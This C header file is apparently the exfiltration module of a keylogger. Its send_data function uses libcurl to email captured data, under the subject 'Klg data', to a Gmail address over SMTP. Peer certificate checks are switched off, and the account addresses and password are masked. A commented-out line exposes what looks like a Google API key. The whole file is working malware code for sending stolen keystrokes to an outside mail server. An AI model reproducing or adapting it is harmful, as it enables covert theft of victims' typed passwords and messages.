#ifndef SEND_DATA_H
#define SEND_DATA_H

#define CURL_STATICLIB
#include "curl/include/curl.h"
#include "curl/include/easy.h"

#include "helper_string.h"

#define FROM        "******@gmail.com"
#define TO          "**********@gmail.com"
#define SMTPUSER 	"***********@gmail.com"
#define SMTPPASS    "*********"

//#define SMTPURL  	"smtp://aspmx.l.google.com:25"
//#define SMTPURL  	"smtp://smtp-relay.gmail.com:587"
//#define SMTPURL  	"smtp://smtp-relay.gmail.com:465"
//#define SMTPURL  	"smtp://smtp-relay.gmail.com:25"
#define SMTPURL  	"smtp://smtp.gmail.com:587"
//#define SMTPURL  	"smtp://smtp.gmail.com:465"


struct upload_status {
  int lines_read;
};

static char **payload_text = NULL;



static size_t payload_source(void *ptr, size_t size, size_t nmemb, void *userp)
{
  struct upload_status *upload_ctx = (struct upload_status *)userp;
  const char *data;

  if((size == 0) || (nmemb == 0) || ((size*nmemb) < 1)) {
	return 0;
  }

  data = payload_text[upload_ctx->lines_read];

  if(data) {
	size_t len = strlen(data);
	memcpy(ptr, data, len);
	upload_ctx->lines_read++;

	return len;
  }

  return 0;
}



bool send_data(char* data ){
	
	const char* payload_text_before[] = {
		"To: " TO "\r\n",
		"From: " FROM " (Mr.Bytes)\r\n",
		"Subject: Klg data\r\n",
		"\r\n", /* empty line to divide headers from body, see RFC5322 */
	};
	
	splitted_str parsed_data = str_split(data);

	const char* payload_text_after[] = {
		"EOF\r\n\r\n",
		NULL
	};
	
	unsigned int n_lines_before = sizeof(payload_text_before)/sizeof(*payload_text_before);
	unsigned int n_lines_after = sizeof(payload_text_after)/sizeof(*payload_text_after);
	unsigned int n_lines_data = parsed_data.n_lines;

	
	unsigned int n_lines = n_lines_before + n_lines_after + n_lines_data;
		
	const char *payload_text_const[n_lines];
	
	for(unsigned int i=0;i<n_lines_before;i++)
		payload_text_const[i] = payload_text_before[i];

	for(unsigned int i=0;i<n_lines_data;i++)
		payload_text_const[n_lines_before+i] = parsed_data.str[i];
	
	for(unsigned int i=0;i<n_lines_after;i++)
		payload_text_const[n_lines_before+n_lines_data+i] = payload_text_after[i];
	
	payload_text = (char**)payload_text_const;
	
	//for(int i=0; i<n_lines;i++){
	//	std::cout<<payload_text_const[i]<<std::endl;
	//}

	CURL *curl;
	CURLcode res = CURLE_OK;
	struct curl_slist *recipients = NULL;
	struct upload_status upload_ctx;

	upload_ctx.lines_read = 0;

	curl = curl_easy_init();
	if(curl) {
		curl_easy_setopt(curl, CURLOPT_URL, SMTPURL);
	
		curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_TRY);
		//curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		
		curl_easy_setopt(curl, CURLOPT_USERNAME, SMTPUSER);
		curl_easy_setopt(curl, CURLOPT_PASSWORD, SMTPPASS);
		
		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM);
		recipients = curl_slist_append(recipients, TO);
		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
		
		curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
		curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
		
		//curl_easy_setopt(curl, CURLOPT_XOAUTH2_BEARER, "AIzaSyCBzXtRgBAM26WZt6-2utZ6nA_r4x5n_RU");
			
		//curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
	
		res = curl_easy_perform(curl);

		if(res != CURLE_OK)
		  fprintf(stderr, "curl_easy_perform() failed: %s\n",
				  curl_easy_strerror(res));
	 
		curl_slist_free_all(recipients);
		curl_easy_cleanup(curl);
			
	}

	// free memory
	for(int i=0; i<parsed_data.n_lines;i++){
		delete parsed_data.str[i];
	}
	delete parsed_data.str;
	
	return true;
}


#endif

